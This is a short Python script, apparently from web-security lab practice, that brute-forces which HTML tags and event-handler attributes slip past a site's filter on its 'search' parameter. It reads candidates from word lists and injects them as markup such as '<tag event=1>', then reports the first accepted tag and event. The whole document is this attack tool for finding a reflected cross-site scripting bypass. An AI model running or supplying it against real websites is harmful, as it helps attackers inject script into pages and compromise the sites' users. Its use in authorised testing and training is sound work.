import urllib
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

ftag = open("tags.txt", "r")
fevent = open("events.txt", "r")

def bf_tag(url):
    for tag in ftag:
        tag = tag.strip("\n")
        inject = url + f"?search=<{tag}>"
        r = requests.get(inject)
        if r.status_code == 200:
            print("Tag: " + tag)
            return tag
        else:
            print(tag)
    return None
            
def bf_event(url, tag):
    for event in fevent:
        event = event.strip("\n")
        inject = url + f"?search=<{tag}+{event}=1>"
        r = requests.get(inject)
        if r.status_code == 200:
            print("Event: " + event)
            return event
        else:
            print(event)
    return None

def main():
    url = input("Enter an URL here: ")
    tag = bf_tag(url)
    event = bf_event(url, tag)
    print("Tag: " + tag + " Event: " + event)

if __name__ == "__main__":
    main()